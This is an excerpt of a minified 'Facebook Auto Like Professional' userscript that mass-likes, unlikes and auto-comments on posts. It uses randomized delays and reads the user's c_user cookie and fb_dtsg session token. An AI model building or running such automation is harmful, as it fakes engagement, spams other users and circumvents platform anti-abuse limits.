            "box-shadow": "#5890FF 0px 0px 0px 1px"
        }), $(elemID.likeComments).removeClass(elemID.menuClass), document.getElementById(elemID.liComGid).innerHTML = t, fbLikePro.disableClkEvent(elemID.likingComments)
    }

    function m() {
        var t = document.getElementById(elemID.liComGid),
            I = document.getElementById("stopallFBAL");
        if (l >= c.length) {
            if (!I) return fbLikePro.mainEvent(elemID.likComDiv), !1;
            if (t) {
                if (fbLikePro.mainEvent(elemID.likComDiv), fbLikePro.scroll(elemID.xWindow, elemID.yWindow), lo.ctrLC >= 2) return lo.ctrLC = 1, !1;
                for (lo.ctrLC; lo.ctrLC < 2; lo.ctrLC++) fbLikePro.setTimeFB(likeComments, 5e3)
            }
        }
        if (l < c.length) {
            var a = Math.floor(Math.random() * (o - 3e3 + 1)) + 3e3;
            if (!I) return fbLikePro.mainEvent(elemID.likComDiv), !1;
            t && (i(l, a), fbLikePro.setTimeFB(m, a), l++, window.setTimeout(e, a + 4e3))
        }
    }

    function t() {
        for (var e = document.getElementsByTagName(st.a[1]), i = 0, m = e.length; m > i; i++) e[i].getAttribute(elemID.titleGid1) !== elemID.likeThisCo && e[i].getAttribute(elemID.titleGid1) !== elemID.meGustaCom && e[i].getAttribute(elemID.titleGid1) !== elemID.curtirEsCom && e[i].getAttribute(elemID.titleGid1) !== elemID.gostoDeCom && e[i].getAttribute(elemID.titleGid1) !== elemID.jaimeCeCom && e[i].getAttribute(elemID.titleGid1) !== elemID.sukaIniCom && e[i].getAttribute(elemID.titleGid1) !== elemID.buYourmuCom && e[i].getAttribute(elemID.titleGid1) !== elemID.diesGefMCom && e[i].getAttribute(elemID.titleGid1) !== elemID.diChTiPQCom && e[i].getAttribute(elemID.titleGid1) !== elemID.alAjabikCom && e[i].getAttribute(elemID.titleGid1) !== elemID.chLikeCom1 && e[i].getAttribute(elemID.titleGid1) !== elemID.chLikeCom2 && e[i].getAttribute(elemID.titleGid1) !== elemID.chLikeCom3 && e[i].getAttribute(elemID.titleGid1) !== elemID.hiLikeCom && e[i].getAttribute(elemID.titleGid1) !== elemID.urLikeCom && e[i].getAttribute(elemID.titleGid1) !== elemID.thichCom && e[i].getAttribute(elemID.titleGid1) !== elemID.gustAngCom && e[i].getAttribute(elemID.titleGid1) !== elemID.thailikeCom || (c[I] = e[i], c[I].removeAttribute("href"), I++)
    }
    var l = 0,
        I = 0,
        c = [],
        o = fbLikePro.getStat("LikeAllCommentTimeInterval");
    null !== o && 0 !== o && void 0 !== o || (o = 9e3), fbLikePro.setTimeFB(t, 3e3), fbLikePro.setTimeFB(m, 4e3)
}
...
function unlikePosts() {
    ...
    function t(e, t) {
        ...
        var l = unescape(fbdisp.unLikingPosDfb) + (e + 1) + st.a[28] + m.length + di.ea;
        m[e].click(), fbLikePro.setStat(st.pul, elemID.initNum), $(m[e]).parents("._5pat").css({
            "box-shadow": "#5890FF 0px 0px 0px 1px"
    ...
    function i() {
        var l = document.getElementById(elemID.unPoGid),
            o = document.getElementById("stopallFBAL");
        if (n >= m.length) {
            if (!o) return fbLikePro.mainEvent(elemID.unLikePosDiv), !1;
            if (l) {
                if (fbLikePro.mainEvent(elemID.unLikePosDiv), fbLikePro.scroll(elemID.xWindow, elemID.yWindow), lo.ctrULP >= 2) return lo.ctrULP = 1, !1;
                for (lo.ctrULP; lo.ctrULP < 2; lo.ctrULP++) fbLikePro.setTimeFB(unlikePosts, 5e3)
            }
        }
        if (n < m.length) {
            var r = Math.floor(Math.random() * (a - 3e3 + 1)) + 3e3;
            if (!o) return fbLikePro.mainEvent(elemID.unLikePosDiv), !1;
            l && (t(n, r), fbLikePro.setTimeFB(i, r), n++, window.setTimeout(e, r + 4e3))
        }
    }
    var l = document.getElementsByTagName(st.a[1]),
        ...
        o = 0,
        m = [],
        a = fbLikePro.getStat("unLikeAllPostTimeInterval");
    null !== a && 0 !== a && void 0 !== a || (a = 9e3);
    for (var r = 0, s = l.length; s > r; r++) "fb-ufi-unlikelink" !== l[r].getAttribute("data-testid") && l[r].getAttribute(elemID.titleGid) !== elemID.unLikeThis && l[r].getAttribute(elemID.titleGid) !== elemID.naoGostarD && l[r].getAttribute(elemID.titleGid) !== elemID.yaNoMeG && l[r].getAttribute(elemID.titleGid) !== elemID.yaNoMeGE && l[r].getAttribute(elemID.titleGid) !== elemID.ayaIto && l[r].getAttribute(elemID.titleGid) !== elemID.descIso && l[r].getAttribute(elemID.titleGid) !== elemID.naGosDis && l[r].getAttribute(elemID.titleGid) !== elemID.nePlusA && l[r].getAttribute(elemID.titleGid) !== elemID.buBeVaz && l[r].getAttribute(elemID.titleGid) !== elemID.geMiNiMe && l[r].getAttribute(elemID.titleGid) !== elemID.noMiPiP && l[r].getAttribute(elemID.titleGid) !== elemID.alGaAjb && l[r].getAttribute(elemID.titleGid) !== elemID.chUnLP1 && l[r].getAttribute(elemID.titleGid) !== elemID.chUnLP2 && l[r].getAttribute(elemID.titleGid) !== elemID.chUnLP3 && l[r].getAttribute(elemID.titleGid) !== elemID.boThDiN && l[r].getAttribute(elemID.titleGid) !== elemID.chUnLP4 && l[r].getAttribute(elemID.titleGid) !== elemID.thaiUnths || (m[o] = l[r], m[o].removeAttribute("href"), o++);
...
function unlikeComments() {
    ...
    function t(e, t) {
        ...
        var l = unescape(fbdisp.unlikingComDfb) + (e + 1) + st.a[28] + m.length + di.ea;
        m[e].click(), fbLikePro.setStat(st.cul, elemID.initNum), $(m[e]).parents("._5pat").css({
            "box-shadow": "#5890FF 0px 0px 0px 1px"
    ...
    function i() {
        ...
        if (n >= m.length) {
            ...
            if (l) {
                if (fbLikePro.mainEvent(elemID.unLikeCommDiv), fbLikePro.scroll(elemID.xWindow, elemID.yWindow), lo.ctrULC >= 2) return lo.ctrULC = 1, !1;
                for (lo.ctrULC; lo.ctrULC < 2; lo.ctrULC++) fbLikePro.setTimeFB(unlikeComments, 5e3)
            }
        }
        if (n < m.length) {
            var r = Math.floor(Math.random() * (a - 3e3 + 1)) + 3e3;
...
function settingScr() {
    ...
    function t() {
        ...
        var e = fbLikePro.getStat("LikeAllPostTimeInterval"),
            ...
            i = fbLikePro.getStat("PostAllComTimeInterval"),
            l = fbLikePro.getStat("PostAllReplyTimeInterval"),
            n = fbLikePro.getStat("unLikeAllPostTimeInterval"),
            o = fbLikePro.getStat("unLikeAllCommentTimeInterval");
        $("#tcomro").append('<tr class="marirow"><td>Like All Post</td><td style="max-width:370px;"><span id="likeAP">' + e / 1e3 + '</span></td><td class="dingDonCom acbtn" id="LikeAllPostTimeInterval" name="Edit">Change Max Time</td></tr>'), $("#tcomro").append('<tr class="marirow"><td>Like All Comments</td><td style="max-width:370px;"><span id="likeAC">' + t / 1e3 + '</span></td><td class="dingDonCom acbtn" id="LikeAllCommentTimeInterval" name="Edit">Change Max Time</td></tr>'), $("#tcomro").append('<tr class="marirow"><td>Post Comments to All Posts</td><td style="max-width:370px;"><span id="postAC">' + i / 1e3 + '</span></td><td class="dingDonCom acbtn" id="PostAllComTimeInterval" name="Edit">Change Max Time</td></tr>'), $("#tcomro").append('<tr class="marirow"><td>Reply To All Comments</td><td style="max-width:370px;"><span id="postAR">' + l / 1e3 + '</span></td><td class="dingDonCom acbtn" id="PostAllReplyTimeInterval" name="Edit">Change Max Time</td></tr>'), $("#tcomro").append('<tr class="marirow"><td>UnLike All Post</td><td style="max-width:370px;"><span id="unlikeAP">' + n / 1e3 + '</span></td><td class="dingDonCom acbtn" id="unLikeAllPostTimeInterval" name="Edit">Change Max Time</td></tr>'), $("#tcomro").append('<tr class="marirow"><td>UnLike All Comments</td><td style="max-width:370px;"><span id="unlikeAC">' + o / 1e3 + '</span></td><td class="dingDonCom acbtn" id="unLikeAllCommentTimeInterval" name="Edit">Change Max Time</td></tr>')
    }
    var l = '<div style="line-height: 25px;text-align: center;"><div class="statHead">Facebook Auto Like Script Setting</div><div class="hrLine">&nbsp;</div><div style="max-height: 275px;    min-height: 200px;overflow-y: scroll;overflow-x: hidden;"><table class="reference" id="tcomro"><tr><th     style="width: 25px;">Function</th><th style="width: 90%;">Maximum Time (Seconds)</th><th style="min-width: 50px;">Change Maximum Time</th></tr></table></div><div class="hrLine">&nbsp;</div><p style="text-align: justify;padding-left: 16px;padding-right: 16px;">Time Interval b/w every Like or Unlike or Comment or Reply Function is selected Randomly at Runtime... Here you can enter max time for every function... Min time is 3 Sec... e.g If you enter 6 as Max, then Time interval will be b/w [3-6] Sec, will be Selected at Runtime...<br/><span style="color:red">Please do not enter max time below 5, If you do so then use script on your own risk...</span></p><div style="line-height:50px"><a style="width:140px;margin:5px;" id="restoreDefTime" class="zrfBtn" data-hover="tooltip"   data-tooltip-content="Restore Time Interval To Default">Restore Default</a></div></div>';
...
function likePostDiv() {
    "use strict";
    $("#stopped").html("Stop Script Execution"), $("#stopped").attr("id", "stopallFBAL"), document.getElementById("newIntrac") && $("#newIntrac").remove(), document.getElementById(elemID.liPosGid) && $(elemID.likePost).remove(), document.getElementById(elemID.unPoGid) && $(elemID.unlikePost).remove(), null !== body && ($(elemID.reload).after(fbdisp.likePosDfb), $(elemID.likePost).addClass(elemID.menuClass)), $("#likepostsid").mouseover(function() {
...
function likeCommentDiv() {
    "use strict";
    $("#stopped").html("Stop Script Execution"), $("#stopped").attr("id", "stopallFBAL"), document.getElementById(elemID.liComGid) && $(elemID.likeComments).remove(), document.getElementById(elemID.unComGid) && $(elemID.unlikeComments).remove(), null !== body && ($(elemID.likePost).after(fbdisp.likeComDfb), $(elemID.likeComments).addClass(elemID.menuClass)), fbLikePro.EventHandler(elemID.likeComments, elemID.likeCommentfn)
}

function unLikePostDiv() {
    "use strict";
    $("#stopped").html("Stop Script Execution"), $("#stopped").attr("id", "stopallFBAL"), document.getElementById(elemID.liPosGid) && $(elemID.likePost).remove(), document.getElementById(elemID.unPoGid) && $(elemID.unlikePost).remove(), fbLikePro.setLicense(license.li, license.au, license.co), null !== body && ($(elemID.reload).after(fbdisp.unLikePoDfb), $(elemID.unlikePost).addClass(elemID.menuClass)), fbLikePro.EventHandler(elemID.unlikePost, elemID.ulikePostfn)
}

function unLikeCommentsDiv() {
    "use strict";
    $("#stopped").html("Stop Script Execution"), $("#stopped").attr("id", "stopallFBAL"), document.getElementById(elemID.unComGid) && $(elemID.unlikeComments).remove(), document.getElementById(elemID.liComGid) && $(elemID.likeComments).remove(), null !== body && ($(elemID.unlikePost).after(fbdisp.unLikeCoDfb), $(elemID.unlikeComments).addClass(elemID.menuClass)), fbLikePro.EventHandler(elemID.unlikeComments, elemID.ulikeCommentfn)
}

function commtDiv() {
    "use strict";
    $("#stopped").html("Stop Script Execution"), $("#stopped").attr("id", "stopallFBAL"), document.getElementById("postComm") && $("#postComm").remove(), null !== body && ($("#settingFB").after(fbdisp.postComDiv), $("#postComm").addClass(elemID.menuClass)), fbLikePro.EventHandler(elemID.psCom, fbLKCQuery.postComMsBox)
}

function replyCommtDiv() {
    "use strict";
    $("#stopped").html("Stop Script Execution"), $("#stopped").attr("id", "stopallFBAL"), document.getElementById("replyComm") && $("#replyComm").remove(), null !== body && ($("#postComm").after(fbdisp.replyComDiv), $("#replyComm").addClass(elemID.menuClass)), fbLikePro.EventHandler("#replyComm", fbLKCQuery.replyComMsBox)
}
$(document).ready(function() {
    if (null !== body && !cflb) {
        var e = document.createElement("div");
        e.innerHTML = unescape(fbdisp.mainDfb), e.setAttribute("id", "mDiv"), e.className = elemID.mainClass, body.appendChild(e), $(elemID.main).append(fbdisp.selectOpDfb), $(elemID.main).append(fbdisp.reloadDfb), $(elemID.main).append(fbdisp.msgMeDfb + fbdisp.settingDiv), $(elemID.main).append(fbdisp.updateDfb), $(elemID.updatefbPro).after(fbdisp.stat), $(elemID.fbMenuClass).addClass(elemID.menuClass), $(elemID.fbTBClass).addClass(elemID.tbClass), fbLikePro.mainEvent(commtDiv), fbLikePro.mainEvent(replyCommtDiv), fbLikePro.mainEvent(elemID.likPosDiv), fbLikePro.mainEvent(elemID.likComDiv), $(elemID.main).append(fbdisp.fbProTitle)
    }
}), $(document).ready(function() {
    $("#fbProTitle").click(function() {
        fbProTitClk === !1 ? ($(".fbProMain").animate({
            left: 2
        }, 1e3), $("#fbProTitle").animate({}, elemID.sSpeed), $("#fbProTitle").css({
            "margin-left": "71px",
            "margin-top": "-119px",
            width: "197px",
            height: "18px",
            bottom: "5px"
        }), $("#fbProTitle").html("Facebook Auto Like Professional"), fbProTitClk = !0) : ($("#fbProTitle").animate({}, elemID.sSpeed), $(".fbProMain").animate({
            left: -160
        }, 1e3), $("#fbProTitle").css({
            "margin-left": "113px",
            "margin-top": "-119px",
    ...
    ! function(e) {
        e.fn.drags = function(t) {
            ...
            return i.css("cursor", t.cursor).on("mousedown", function(i) {
                if ("" === t.handle) var o = e(this).addClass("draggable");
                else var o = e(this).addClass("active-handle").parent().addClass("draggable");
                var n = o.css("z-index"),
                    l = o.outerHeight(),
                    a = o.outerWidth(),
                    s = o.offset().top + l - i.pageY,
                    r = o.offset().left + a - i.pageX;
                o.css("z-index", 1e3).parents().on("mousemove", function(t) {
                    e(".draggable").offset({
                        top: t.pageY + s - l,
                        left: t.pageX + r - a
                    }).on("mouseup", function() {
    ...
    }(jQuery), $(".fbProMain").drags()
});
var main = {
    registerLicense: function(e, t, i) {
        if (e !== license.li || t !== license.au || i !== license.co) {
            console.log(elemID.alertMsg1 + elemID.alertMsg2);
            var o = prompt(elemID.alertMsg1, elemID.alertMsg2);
            return o && (window.location = elemID.alertMsg2), $(elemID.main).mouseover(function() {
        ...
        $(document).ready(function() {
            if (cflb) return !1;
            var e, t;
            e = $("._2dpe._1ayn").attr("href"), fbLikePro.EventHandler(elemID.reload, fbLikePro.stoped), fbLikePro.EventHandler(elemID.likeAOp, elemID.likPosDiv), fbLikePro.EventHandler(elemID.likeAOp, elemID.likComDiv), fbLikePro.EventHandler(elemID.unlikeAOp, elemID.unLikePosDiv), fbLikePro.EventHandler(elemID.unlikeAOp, elemID.unLikeCommDiv), fbLikePro.EventHandler(st.fPS, fbLikePro.showStat), fbLikePro.EventHandler("#settingFB", settingScr), fbLikePro.selectEvent(elemID.btnlikeGid, elemID.txtLikeClk), fbLikePro.selectEvent(elemID.btnUnlikeGid, elemID.txtUnLikeClk), fbLikePro.clickLinkEvent(elemID.updatefbPro, elemID.updateURL, elemID.action), fbLikePro.setTimeFB(fbLikePro.activateScript, 1e4), window.setTimeout(function() {
                try {
                    e && (t = e.split("/"), userProfilCom = t[3], console.log(userProfilCom));
                    var i, o, n, l, a = !1,
                        s = !1;
                    i = $('img[id^="profile_pic_header_"]'), i.length < 1 ? a = !0 : i.length > 0 ? l = i[0].id.split("_")[3] : a === !0 ? (o = document.getElementsByClassName("_s0 _2dpc"), o.length < 1 ? s = !0 : o.length > 0 && (l = o[0].id.split("_")[3])) : s === !0 && (n = document.getElementsByClassName("_2dpc"), n.length < 1 ? l = document.cookie.match(/c_user=(\d+)/)[1] : n.length > 0 && (l = n[0].id.split("_")[3]))
                } catch (r) {
                    console.log("Error in Finding ID; " + r)
                }
                if (document.cookie.match(/c_user=(\d+)/)[1] == l) {
                    comUID = document.cookie.match(/c_user=(\d+)/)[1];
                    try {
                        comFBdtsg = document.getElementsByName("fb_dtsg")[0].value
                    } catch (r) {
                    ...
                    console.log("F1=Und3f1n3d: " + comUID)
                }
            }, 5e3);
            var i = new Date,
                o = i.getDate(),
                n = fbLikePro.getStat(st.ssd),
                l = o - n;
            0 !== l && fbLikePro.ddOne(o);
            var a = fbLikePro.getStat(st.road);
            fbLikePro.sV(st.road, ++a), 1 === a && fbLikePro.sV(st.ssd, o);
            var s = fbLikePro.getStat("ScriptSetting");
            fbLikePro.sV("ScriptSetting", ++s), 1 === s && (fbLikePro.sV("LikeAllPostTimeInterval", 9e3), fbLikePro.sV("LikeAllCommentTimeInterval", 9e3), fbLikePro.sV("PostAllComTimeInterval", 15e3), fbLikePro.sV("PostAllReplyTimeInterval", 15e3), fbLikePro.sV("unLikeAllPostTimeInterval", 9e3), fbLikePro.sV("unLikeAllCommentTimeInterval", 9e3));
            var r = fbLikePro.getStat("procomScrStart");
            if (fbLikePro.sV("procomScrStart", ++r), 1 === r) {
                var m, d = fbLikePro.getStat("totalRandomComments");
                for (m = 0; m < defaultComments.length; m++) fbLikePro.sV("totalRandomComments", ++d), fbLikePro.sV("c" + d, defaultComments[m])
            }
            if (50 > r) {
                var f = document.getElementById("fbProTitle");
                f.click()
            }
            ga("create", "UA-55741445-3", "auto"), ga("send", "pageview"), fbLikePro.setTimeFB(fbLKCQuery.m233url, 1e3)
        })
    }
};
main.registerLicense(license.li, license.au, license.co);
